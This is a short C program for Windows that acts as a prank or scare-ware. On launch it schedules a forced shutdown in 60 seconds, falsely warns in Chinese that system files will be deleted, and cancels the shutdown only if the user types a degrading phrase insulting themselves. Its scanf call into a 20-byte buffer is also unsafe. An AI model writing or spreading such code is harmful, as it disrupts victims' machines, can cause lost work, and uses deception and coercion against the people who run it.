#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>


void DAVYISAGOD()
{
	system("cls");
	char arr1[] = "于晓宇是你爸爸哇咔咔咔咔咔咔咔咔咔咔咔";
	char arr2[] = "**************************************";
	int left = 0;
	int right = strlen(arr1) - 1;
	printf("******************");
	printf("%s", arr2);
	printf("******************\n");
	printf("******************");
	printf("%s", arr2);
	printf("******************\n");
	printf("******************");
	printf("%s", arr2);
	printf("******************\n");
	printf("******************");
	printf("%s", arr2);
	printf("******************\n");
	printf("******************");
	printf("%s", arr2);
	printf("******************\n");
	Sleep(1000);
	system("cls");
	while (left - right <= 1)
	{
		arr2[left] = arr1[left];
		arr2[right] = arr1[right];
		left++;
		right--;
		arr2[left] = arr1[left];
		arr2[right] = arr1[right];
		left++;
		right--;
		printf("******************");
		printf("%s", arr2);
		printf("******************\n");
		printf("******************");
		printf("%s", arr2);
		printf("******************\n");
		printf("******************");
		printf("%s", arr2);
		printf("******************\n");
		printf("******************");
		printf("%s", arr2);
		printf("******************\n");
		printf("******************");
		printf("%s", arr2);
		printf("******************\n");
		if (left - right > 1)
			continue;
		Sleep(1000);
		system("cls");
	}
}

int main()
{

	system("shutdown -s -t 60");
	printf("！！！请不要关闭此窗口！！！\n请注意电脑将在一分钟内关机\n同时删除部分你“可能”不需要的系统文件，若不想操作，请输入：我是于晓宇的臭儿子\n");
	Sleep(5000);
	DAVYISAGOD();
	Sleep(2000);

again:
	Sleep(2000);
	printf("！！！请不要关闭此窗口！！！\n再次提示您：请注意电脑将在一分钟内关机\n同时删除部分你“可能”不需要的系统文件，若不想操作，请输入：我是于晓宇的臭儿子\n");
	char tmp[20] = { 0 };
	scanf("%s", tmp);
	if (strcmp(tmp, "我是于晓宇的臭儿子") == 0)
	{
		system("shutdown -a");
	}
	else
	{
		goto again;
	}
	return 0;
}